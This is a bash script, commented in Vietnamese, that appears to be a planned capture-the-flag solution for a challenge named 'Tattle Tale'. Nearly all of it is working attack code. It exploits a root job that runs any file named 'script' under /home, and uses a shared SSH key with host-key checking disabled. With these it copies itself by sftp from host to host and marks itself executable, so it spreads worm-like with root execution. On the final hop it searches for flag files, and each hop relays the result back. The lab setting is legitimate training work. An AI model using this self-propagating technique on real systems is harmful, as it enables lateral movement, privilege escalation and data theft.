#!/bin/bash
# Tattle Tale - bo lan du kien (CHUA chay; moi kiem chung den root code execution tren hop `one`).
#
# Gia thiet da doc duoc tu co che:
#   * moi hop la container Alpine/openssh, user duy nhat = ten cua hop LIEN TRUOC (tren `one` la `zero`),
#     home = /home/<user>, chroot cua user do = chinh /home/<user>.
#   * vong `/etc/sftp.d/run_scripts` chay root moi 10s: find /home -name script -exec {} \;
#   * key "Universal" duoc bind-mount vao /home/<user>/.ssh/key tren moi hop, dung duoc cho moi user.
#
# Vuot song (ten = hostname cua hop hien tai, dung theo tho cua de):
#   1) push bao chinh no sang hop ke tiep, dang nhap bang user = ten minh -> /scripts/script
#   2) hop cuoi (khong con ten tiep theo phan giai duoc) doc co, ghi vao /home/<user>/flag.txt
#   3) hop trung gian keo /scripts/flag.txt tu hop duoi ve, roi ghi tiep cho hop tren
#   => co chay nguoc ve `one` nam trong /home/zero/scripts, player `get /scripts/flag.txt`.

set -u
read -r -a N <<< "zero one two three four five six seven"
H=$(hostname)
IDX=""
for i in "${!N[@]}"; do
    [ "${N[$i]}" = "$H" ] && IDX=$i
done
[ -z "$IDX" ] && exit 0                     # not a hop (vd may terminal)

PREV=${N[$((IDX - 1))]}                      # user dia phuong cua hop nay
NEXT=${N[$((IDX + 1))]}                      # ten hop ke tiep, "" neu het
KEY=$(ls /home/*/.ssh/key 2>/dev/null | head -1)
SELF=$(find /home -name script 2>/dev/null | head -1)
SFTP_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=6"
LOG=/home/$PREV/scripts/prop.log

if command -v flock >/dev/null 2>&1; then
    exec 9>/tmp/prop.lock; flock -n 9 || exit 0
fi

{
    echo "== $(date -Is) hop=$H prev=$PREV next=${NEXT:-NONE} key=$KEY self=$SELF"

    if [ -n "$NEXT" ] && getent hosts "$NEXT" >/dev/null 2>&1 && [ -n "$SELF" ]; then
        printf 'put %s /scripts/script\nchmod 755 /scripts/script\n' "$SELF" > /tmp/pb.txt
        echo "-- push sang $NEXT"
        timeout 20 sftp $SFTP_OPTS -b /tmp/pb.txt -i "$KEY" "$H@$NEXT" 2>&1 | tail -4
    fi

    if [ -z "$NEXT" ] || ! getent hosts "$NEXT" >/dev/null 2>&1; then
        echo "-- hop cuoi: tim co"
        for f in /flag /flag.txt /root/flag "/home/floor/flag" "/home/$PREV/flag"; do
            if [ -f "$f" ]; then echo "lay $f"; cat "$f" > /tmp/flag.txt; break; fi
        done
        if [ ! -s /tmp/flag.txt ]; then
            find / -xdev -type f -iname '*flag*' -not -path '/proc/*' 2>/dev/null | head -5
        fi
    else
        echo "-- keo flag.txt tu $NEXT"
        printf 'get /scripts/flag.txt /tmp/flag.txt\n' > /tmp/gb.txt
        timeout 20 sftp $SFTP_OPTS -b /tmp/gb.txt -i "$KEY" "$H@$NEXT" 2>&1 | tail -3
    fi

    if [ -s /tmp/flag.txt ]; then
        cp /tmp/flag.txt "/home/$PREV/scripts/flag.txt"
        chmod 666 "/home/$PREV/scripts/flag.txt"
        echo "-- da ghi /home/$PREV/scripts/flag.txt ($(wc -c < "/home/$PREV/scripts/flag.txt") byte)"
    fi
} > "$LOG" 2>&1
chmod 666 "$LOG" 2>/dev/null
